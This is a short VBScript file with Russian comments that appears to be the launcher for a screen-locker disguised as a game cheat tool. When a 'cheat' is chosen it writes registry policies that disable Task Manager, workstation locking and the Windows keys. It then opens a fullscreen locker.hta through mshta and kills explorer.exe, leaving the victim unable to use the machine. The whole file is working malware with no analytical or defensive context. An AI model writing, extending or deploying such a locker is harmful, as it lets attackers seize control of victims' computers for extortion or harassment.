Option Explicit
Dim shell, fso, tempFolder, lockerPath, currentFolder
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
currentFolder = fso.GetParentFolderName(WScript.ScriptFullName)
lockerPath = currentFolder & "\locker.hta"

' Проверка выбора чита
Sub CheckAndRun()
    Dim argFile, cheatId
    argFile = tempFolder & "\cheat_arg.txt"
    
    If fso.FileExists(argFile) Then
        Dim ts
        Set ts = fso.OpenTextFile(argFile, 1)
        If Not ts.AtEndOfStream Then
            cheatId = Trim(ts.ReadLine)
            ts.Close
            fso.DeleteFile argFile
            RunFullscreenLocker()
        Else
            ts.Close
        End If
    End If
End Sub

' Запуск полноэкранного локера
Sub RunFullscreenLocker()
    On Error Resume Next
    ' Блокируем диспетчер задач
    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", 1, "REG_DWORD"
    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWinKeys", 1, "REG_DWORD"
    On Error GoTo 0
    
    ' Запускаем локер в полноэкранном режиме через mshta с параметром
    shell.Run "mshta.exe """ & lockerPath & """", 1, False
    
    ' Закрываем проводник
    shell.Run "taskkill /f /im explorer.exe", 0, False
    
    WScript.Quit
End Sub

' Ждём выбора чита
Do
    CheckAndRun()
    WScript.Sleep 500
Loop